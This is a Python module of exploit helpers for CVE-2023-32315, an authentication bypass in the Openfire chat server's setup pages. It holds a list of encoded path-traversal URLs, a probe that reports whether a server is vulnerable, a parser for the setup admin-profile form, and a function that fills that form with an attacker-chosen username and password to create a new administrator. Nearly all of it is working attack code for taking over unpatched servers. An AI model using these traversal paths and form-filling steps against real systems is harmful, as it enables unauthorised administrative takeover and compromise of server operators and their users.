#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2023-32315 Openfire setup environment auth bypass helpers."""

from __future__ import annotations

import re
from typing import Any, Callable, Dict, List, Optional, Tuple

SETUP_TRAVERSAL_PATHS: List[str] = [
    "/setup/setup-admin-profile.jsp",
    "/setup/%u002e%u002e/setup/setup-admin-profile.jsp",
    "/setup/..%u2215setup/setup-admin-profile.jsp",
    "/%u002e/setup/setup-admin-profile.jsp",
    "/setup/setup-environment.jsp",
    "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
]

SETUP_PAGE_HINTS = (
    "setup-admin-profile",
    "create admin account",
    "setup-environment",
    "openfire setup",
)


def openfire_setup_page_hit(body: str, *, path: str = "") -> bool:
    text = (body or "").lower()
    if any(hint in text for hint in SETUP_PAGE_HINTS):
        return True
    # Legacy Nucleus-style check: setup-s traversal to log.jsp (see cve_2023_32315_detect).
    if path.rstrip("/").endswith("log.jsp"):
        markers = ("apache", "java", "openfire", "jivesoftware")
        return all(m in text for m in markers)
    return False


def probe_openfire_setup_bypass(
    http_get: Callable[..., Any],
    paths: Optional[List[str]] = None,
) -> Dict[str, Any]:
    """Try traversal paths; return first hit with status 200 and setup hints."""
    result: Dict[str, Any] = {
        "vulnerable": False,
        "path": "",
        "status": 0,
        "error": "",
    }
    for path in paths or SETUP_TRAVERSAL_PATHS:
        try:
            response = http_get(path, allow_redirects=False)
        except Exception as exc:
            result["error"] = str(exc)[:200]
            continue
        if not response:
            continue
        status = int(getattr(response, "status_code", 0) or 0)
        body = getattr(response, "text", "") or ""
        if status == 200 and openfire_setup_page_hit(body, path=path):
            result["vulnerable"] = True
            result["path"] = path
            result["status"] = status
            return result
    return result


_FORM_RE = re.compile(r"<form[^>]*>(.*?)</form>", re.I | re.S)
_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.I)
_ATTR_RE = re.compile(r'(\w+)\s*=\s*"([^"]*)"')


def parse_openfire_setup_admin_form(html: str) -> Tuple[str, Dict[str, str]]:
    match = _FORM_RE.search(html or "")
    if not match:
        return "/setup/setup-admin-profile.jsp", {}
    block = match.group(0)
    action = "/setup/setup-admin-profile.jsp"
    action_match = re.search(r'action\s*=\s*"([^"]*)"', block, re.I)
    if action_match:
        action = action_match.group(1)
    fields: Dict[str, str] = {}
    for input_match in _INPUT_RE.finditer(block):
        attrs = dict(_ATTR_RE.findall(input_match.group(1)))
        name = attrs.get("name")
        if not name:
            continue
        if attrs.get("type", "").lower() in ("submit", "button", "reset"):
            continue
        fields[name] = attrs.get("value", "")
    return action, fields


def openfire_admin_form_fields(
    fields: Dict[str, str],
    *,
    username: str,
    password: str,
    email: str,
) -> Dict[str, str]:
    data = dict(fields or {})
    data.update(
        {
            "username": username,
            "password": password,
            "confirmPassword": password,
            "passwordConfirm": password,
            "email": email,
            "name": username,
        }
    )
    for key in list(data):
        low = key.lower()
        if "user" in low and low not in ("username",):
            data[key] = username
        if low in ("newpassword", "pass", "pwd"):
            data[key] = password
    return data
